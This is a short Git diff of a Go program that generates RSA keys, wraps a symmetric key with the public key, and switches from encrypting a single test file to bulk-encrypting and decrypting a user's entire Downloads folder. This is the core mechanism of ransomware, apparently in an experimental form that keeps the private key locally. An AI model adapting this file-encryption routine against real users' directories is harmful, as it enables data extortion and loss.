@@ -21,14 +21,15 @@ func main() {
 		file.BytesToNewFile(PubKeyFile, keys.PublicKeyToBytes(publicKey))
 		file.BytesToNewFile(PrivKeyFile, keys.PrivateKeyToBytes(privateKey))
 		//Encrypt file
-		key := encryption.GenKey()
+		var key *[]byte
+		key = encryption.GenKey()
 		file.BytesToNewFile("safe_key", keys.EncryptWithPublicKey(key, publicKey))
-		file, err := file.Encrypt("test.mp4", key)
+		nbrFiles, err := file.EncryptAll("C:\\Users\\peter\\Downloads", key)
 		if err != nil {
 			log.Fatal(err)
 		}
 
-		fmt.Println(file)
+		fmt.Println("Encrypted files number: ", nbrFiles)
 	} else {
 		//File Decryption
 		encryptedKey, err := file.BytesFromFile("safe_key")
@@ -40,13 +41,14 @@ func main() {
 			log.Fatal(err)
 		}
 		privateKey := keys.BytesToPrivateKey(privateKeyBytes)
-		key := keys.DecryptWithPrivateKey(encryptedKey, privateKey)
-		file, err := file.Decrypt("test.mp4.ec", key)
+		var key *[]byte
+		key = keys.DecryptWithPrivateKey(encryptedKey, privateKey)
+		nbrFiles, err := file.DecryptAll("C:\\Users\\peter\\Downloads", key)
 		if err != nil {
 			log.Fatal(err)
 		}
 
-		fmt.Println(file)
+		fmt.Println(nbrFiles)
 	}
 
 }
